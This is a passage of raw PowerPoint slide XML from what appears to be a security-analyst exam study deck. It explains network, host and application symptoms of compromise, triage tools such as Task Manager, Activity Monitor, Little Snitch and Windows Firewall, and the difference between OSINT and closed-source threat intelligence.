            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Peer-to-peer communications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rogue devices</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scan sweeps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169</a:t>
            </a:r>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NETWORK SYMPTOMS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Scan Sweep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A scan sweep is a reconnaissance technique in which an attacker systematically probes a range of IP addresses or ports to discover live hosts, open services, and potential vulnerabilities before launching an attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It appears in logs as many connection attempts from a single source to sequential addresses or ports in a short window (a horizontal sweep across many hosts on one port, or a vertical scan of many ports on one host), and tools like Nmap generate these patterns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detecting scan sweeps early lets a SOC analyst identify the reconnaissance phase of the kill chain and respond, blocking the source or increasing monitoring, before the attacker moves to exploitation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to recognize a burst of connections across an IP or port range as reconnaissance/scanning and to place it in the earliest phase of an attack framework.</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170</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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NETWORK SYMPTOMS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Scan Sweep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g_09f874a379.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2322004"/>
            <a:ext cx="10634472" cy="3356992"/>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171</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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Diagnose Symptoms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g_9c03ad695f.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1576483" y="1783080"/>
            <a:ext cx="9035986" cy="4434840"/>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172</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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Host-Related Symptoms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Host-related symptoms are indicators of compromise observed on an individual endpoint, including abnormal memory, disk, or processor consumption that can signal malware, cryptomining, or a resource-exhaustion condition.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Other signs are unauthorized applications or processes running on the system, unauthorized privileges (privilege escalation where an account or process gains rights it should not have), and evidence of data exfiltration such as staged archives or unusual outbound file transfers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst investigates these using task/process managers, EDR telemetry, and log review to confirm whether the host is compromised, host-level symptoms often provide the first concrete proof that a network alert corresponds to a real infection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect items linking a described endpoint condition (spiking CPU, an unknown process, a newly elevated account) to malware type or attack stage, and asking which host tool confirms it.</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173</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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Host-Related Symptoms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Memory consumption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Disk consumption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Processor consumption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Unauthorized applications or processes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Unauthorized privileges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data exfiltration</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174</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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Windows Task Manager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Windows Task Manager is a built-in utility that displays running processes, CPU, memory, disk, and network utilization, startup programs, and services, giving an analyst a quick real-time view of what is executing on a Windows host.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  During triage it helps identify suspicious or unauthorized processes, unusually high resource consumption (a hallmark of cryptomining or a runaway malicious process), and unexpected network activity, and it can terminate processes, though deeper analysis uses Sysinternals tools like Process Explorer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses it as a first-response diagnostic on a suspect endpoint to confirm host-related symptoms before escalating to forensic tooling.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam references Task Manager as the native Windows tool for spotting rogue processes and resource-consumption symptoms during host investigation.</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175</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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Windows Task Manager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g_da96cdaf77.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2155638" y="1783080"/>
            <a:ext cx="7877676" cy="4434840"/>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176</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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macOS Activity Monitor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macOS Activity Monitor is the native Apple equivalent of Task Manager, showing running processes and their CPU, memory, energy, disk, and network usage on a Mac.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It lets an analyst identify processes consuming abnormal resources, spot unfamiliar or unauthorized applications, inspect a process's open files and network connections, and force-quit a suspect process during triage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC supporting mixed environments, knowing the macOS tool ensures the analyst can diagnose host-related symptoms on Apple endpoints, not just Windows machines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect it to appear as the correct macOS-native utility for viewing per-process resource consumption when a scenario specifies a Mac endpoint.</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177</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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HOST SYMPTOMS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macOS Activity Monitor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g_5f2c3ce24a.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2505824" y="1783080"/>
            <a:ext cx="7177304" cy="4434840"/>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178</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Application-Related Symptoms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Application-related symptoms are indicators that a specific application has been attacked or is misbehaving, including anomalous activity that deviates from expected use patterns and unexpected error messages that may reveal injection attempts, tampering, or crashes triggered by an exploit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Out-of-memory alerts can point to a memory-leak exploit, a fuzzing attack, or resource exhaustion, while unexpected outbound transmissions from an application often signal that it has been compromised and is exfiltrating data or communicating with C2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst monitors application and web-server logs, WAF alerts, and application performance data to catch these signs, because application-layer attacks such as SQL injection or XSS frequently surface here rather than at the network layer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Exam stems describe application log entries or behaviors (repeated errors, unexpected egress) and ask you to identify the likely attack such as injection or a compromised process beaconing out.</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179</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Application-Related Symptoms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g_ec727e1c5a.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3280066"/>
            <a:ext cx="10634472" cy="1440868"/>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180</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Application-Related Symptoms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Anomalous activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Unexpected error messages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Out of memory alerts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Unexpected outbound transmissions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181</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Little Snitch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Little Snitch is a host-based outbound firewall application for macOS that monitors and controls the network connections each application attempts to make, alerting the user and allowing per-application allow/deny rules.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it focuses on egress, it is especially useful for detecting unexpected outbound transmissions, a compromised app phoning home to a C2 server or silently exfiltrating data becomes visible when Little Snitch prompts about an unauthorized connection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst values host firewalls like this for surfacing the outbound-connection symptoms that perimeter controls may miss, particularly on endpoints operating off the corporate network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may cite Little Snitch as a macOS host-based (application/outbound) firewall used to detect and block unexpected outbound connections from applications.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182</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Little Snitch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g_dbebe47da6.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1890084" y="1783080"/>
            <a:ext cx="8408784" cy="4434840"/>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183</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Windows Firewall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Windows Firewall (Windows Defender Firewall) is the built-in host-based firewall in Windows that filters inbound and outbound traffic based on rules tied to ports, protocols, applications, and network profiles (domain, private, public).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It works by evaluating each connection against configured rules and applying the profile matching the current network, and it can be managed centrally through Group Policy and inspected via the Windows Firewall with Advanced Security console for detailed rule and logging control.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, it provides a per-host enforcement point that limits lateral movement and blocks unauthorized services, and its logs help diagnose blocked or suspicious connection attempts on an endpoint.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect Windows Firewall to appear as the native host-based firewall for controlling inbound/outbound traffic and enforcing network-profile-based rules, often manageable via Group Policy.</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184</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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APPLICATION SYMPTOMS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Windows Firewall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g_14be08e654.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2830889" y="1783080"/>
            <a:ext cx="6527174" cy="4434840"/>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185</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Intelligence Sources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Intelligence sources are the origins of threat data that inform an analyst's understanding of adversaries, and they fall into two broad categories: open-source intelligence (OSINT) gathered from publicly available material such as vendor blogs, security advisories, social media, public feeds, and DNS/WHOIS records, and closed-source or proprietary intelligence obtained from paid vendors, commercial threat feeds, ISACs, and government or membership-restricted sharing communities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OSINT is free and broad but requires vetting for accuracy and relevance, whereas proprietary intelligence is typically more curated, timely, and context-rich but comes at a cost and under usage restrictions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC blends both so its detections and threat hunts are driven by current indicators and adversary TTPs, choosing sources based on their timeliness, relevance, accuracy, and confidence level.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests the distinction between OSINT and closed-source/proprietary intelligence and asks you to evaluate a source on criteria such as timeliness, relevancy, accuracy, and confidence.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186</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Intelligence Sources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Open-source intelligence (OSINT)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Closed-source/ proprietary intelligence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187</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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OSINT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Open-Source Intelligence (OSINT) is threat and reconnaissance information gathered from publicly available sources that anyone can access without special permission or covert techniques.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common sources include search engines like Google, job posting sites that reveal an organization's technologies and staff, public internet registries such as WHOIS and regional IP registries, DNS records, and social media profiles that expose employee and organizational details.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses OSINT both defensively, to understand what an attacker can learn about their own organization's attack surface, and offensively during threat hunting to enrich indicators and profile adversaries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to identify OSINT sources (WHOIS, search engines, social media, job sites) and distinguish them from closed-source feeds when selecting intelligence sources.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188</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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OSINT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Intelligence anyone can find</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Source examples</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Google</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Job sites</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Internet registries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Social media</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189</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Closed-Source Intelligence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Closed-source intelligence is threat data obtained through privileged or restricted access rather than public channels, such as commercial paid threat feeds, government or ISAC sharing communities, and information collected covertly through internal telemetry or private research.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it is not freely available, it is often more curated, timely, and tailored to specific industries, but it typically requires a subscription, a trust relationship, or a membership agreement to obtain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An analyst weighs closed-source intelligence for its higher fidelity and sector relevance against its cost and access restrictions, frequently combining it with OSINT to build a fuller threat picture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You may be asked to contrast closed-source (proprietary, privileged, paid) intelligence with OSINT and to choose the appropriate source for a scenario's cost and reliability needs.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190</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Closed-Source Intelligence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Privileged access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Covertly collected</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191</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide1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INTELLIGENCE SOURCES AND CONFIDENCE LEVELS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Gathering Important Information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When collecting threat intelligence, analysts evaluate each source against three core criteria: timeliness, relevancy, and accuracy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
